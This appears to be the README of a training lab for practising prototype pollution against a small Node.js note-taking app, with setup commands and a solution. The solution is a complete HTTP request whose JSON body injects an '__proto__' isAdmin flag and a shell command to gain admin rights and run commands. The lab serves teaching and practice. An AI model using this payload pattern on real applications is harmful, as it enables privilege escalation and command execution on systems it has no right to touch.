# Hands On Lab For Prototype Pollution

[![Build Status](https://api.travis-ci.org/joemccann/dillinger.svg?branch=de)](https://travis-ci.org/joemccann/dillinger)

This lab environment helps you to try prototype pollution in practice, the aim is to exploit prototype pollution to change priviledge of the user from user to admin and execute commands.

##### Docker Mode

You can run it as a docker instance by executing the following commands :: 
  ```
 $ npm install
 $ docker build -t webapp .
 $ docker run -p 80:80 -d webapp
  
  ```


##### Node Application

You can run it using node by executing the following commands ::

  ```
 $ npm install
 $ node app.js
  ```
  
#### Solution

```
 
POST /addnote HTTP/1.1
Host: localhost
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
content-type: application/json
Content-Length: 139
 
{"auth": {"name": "test", "password": "test"}, "note": { "text": "bla",
"command":"ls",
 "__proto__": {"isAdmin": true}}}

```
   
